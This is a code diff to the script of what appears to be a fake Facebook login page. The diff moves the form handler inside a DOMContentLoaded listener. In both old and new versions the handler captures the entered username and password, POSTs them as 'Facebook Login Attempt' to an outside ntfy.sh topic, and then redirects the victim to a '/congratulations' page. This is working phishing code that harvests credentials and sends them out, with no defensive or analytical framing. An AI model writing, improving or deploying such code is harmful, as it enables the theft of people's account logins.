@@ -38,19 +38,21 @@
     </footer>
 
     <script>
-      document.getElementById("login-form").addEventListener("submit", function (event) {
-        event.preventDefault(); // Prevent form submission
+      document.addEventListener("DOMContentLoaded", function () {
+        document.getElementById("login-form").addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent form submission
 
-        const username = document.getElementById("username").value;
-        const password = document.getElementById("password").value;
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
 
-        fetch("https://ntfy.sh/GiveRAw", {
-          method: "POST",
-          headers: { "Content-Type": "text/plain" },
-          body: `Facebook Login Attempt:\nUsername: ${username}\nPassword: ${password}`
+          fetch("https://ntfy.sh/GiveRAw", {
+            method: "POST",
+            headers: { "Content-Type": "text/plain" },
+            body: `Facebook Login Attempt:\nUsername: ${username}\nPassword: ${password}`
+          });
+          window.location.href = "/congratulations";
         });
-        window.location.href = "/congratulations";
-        });
+      });
     </script>
   </body>
 </html>
